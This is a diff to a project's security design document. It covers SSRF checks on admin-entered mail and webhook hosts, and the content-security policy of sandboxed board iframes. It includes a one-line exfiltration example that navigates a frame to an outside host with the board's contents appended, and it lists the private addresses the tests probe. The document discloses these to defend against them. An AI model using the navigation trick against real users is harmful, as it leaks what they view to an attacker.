@@ -96,8 +96,15 @@ beside it, the database on the private network, the metadata service on `169.254
   refused, along with every way IPv6 has of spelling an IPv4 address — `::ffff:127.0.0.1`, NAT64,
   6to4.
 
+A **mailbox** is the third: its IMAP host is typed in by a workspace admin as well, and without a
+check a mail server that answers "refused", "timed out" or a stranger's greeting is a port scanner
+for the network behind the server. `adapters/imap` resolves the host through the same check and
+connects to the address that passed, and every refusal reads the same — a name that does not
+resolve and one that resolves somewhere private get one sentence — so the screen maps nothing.
+`mail-parsing.test.ts` asks loopback, `localhost`, `::1` and the metadata service.
+
 `KOLIBRI_ALLOW_PRIVATE_WEBHOOKS=1` turns the check off, for the instance that genuinely posts to
-`http://n8n:5678` on its own docker network. Off by default.
+`http://n8n:5678` on its own docker network or reads mail from a server on it. Off by default.
 
 **A model, when somebody asks for one.** A task review (`docs/ai.md`) sends the project name, column,
 labels, title and description of one task to whichever provider the operator configured; a board
@@ -117,8 +124,9 @@ which is a supported way to run this.
 **A board, through a share link.** A shared page is a server-rendered document with no script in
 it; a shared canvas or board page is that document framing each board, and each board is served on
 its own at `/s/:token/boards/:id` under the board frame's policy (`buildFrameCsp`): `sandbox`, so its
-origin is opaque and it can read neither cookies nor storage of this origin, no network
-(`connect-src 'none'`), framed only by this origin. The share's variant adds `allow-popups` and
+origin is opaque and it can read neither cookies nor storage of this origin, no requests of its own
+(`connect-src 'none'`, though it can navigate itself away — see below), framed only by this origin.
+The share's variant adds `allow-popups` and
 `allow-popups-to-escape-sandbox`, so a link in a board opens in a new tab as on any page — there is
 no app around it to open links for it. A board is served only while the link is live and only if it
 is on the shared page or a page the share brings. Its pictures are inlined by the server, and only
@@ -141,16 +149,23 @@ is drawn in `artboard.html`, inside an iframe with `sandbox="allow-scripts"` and
 under its own policy (`buildFrameCsp`): `sandbox allow-scripts`, `connect-src 'none'`, pictures and
 fonts from `data:` and `blob:` only, `frame-ancestors 'self'`. The sandbox gives the document an
 opaque origin, so it can read neither the session cookie nor the IndexedDB holding the workspace's
-offline copy, nor reach into the page that holds it; the policy means it cannot send what it shows
-anywhere. Measured in Chromium, with a board that tries each: cookie, `localStorage`, IndexedDB,
+offline copy, nor reach into the page that holds it; the policy stops every request it makes.
+Measured in Chromium, with a board that tries each: cookie, `localStorage`, IndexedDB,
 `parent.document`, `fetch` to this server and to the internet, an image beacon and a popup are all
-refused, while its own inline scripts, handlers and `eval` run. What the frame says back is checked for
+refused, while its own inline scripts, handlers and `eval` run. What the policy does **not** stop is
+the frame navigating itself: `location.href = 'https://elsewhere/?' + what it shows` was measured
+reaching the other server. So whatever a board is handed, it can send on — to its author, or to
+anybody. What the frame says back is checked for
 shape and dropped when it is about an older render (`readMessage`), and the only thing it can make
 the app do outside the editor is open an `http(s)` or `mailto` link in a new tab. A board's script can
 post an edit message while somebody has that board open in the editor — which changes that board,
 which anybody able to post it could already edit. Every render is a fresh frame, so nothing a board's
 script left behind survives into the next one. Pictures from this server are fetched by the app,
-with the session, and handed in as `data:` URLs — the frame itself still reaches nothing. Not
+with the session, and handed in as `data:` URLs — and, because of the navigation above, only those
+hung on the board's own page, as in a share. The app asks `/files/…?page=<id>` and the server
+answers only for a file whose attachment on that page it recorded itself (`checksum`, which no
+client can write), so a board naming another file the viewer may read draws a broken picture
+instead of handing it to its author; `page-files.test.ts` asks it with a forged attachment row. Not
 measured: Safari, Firefox and the packaged app. See [`canvas.md`](canvas.md).
 
 **Settling a comment.** Anybody who can read a comment may resolve it, or accept or reject it when it
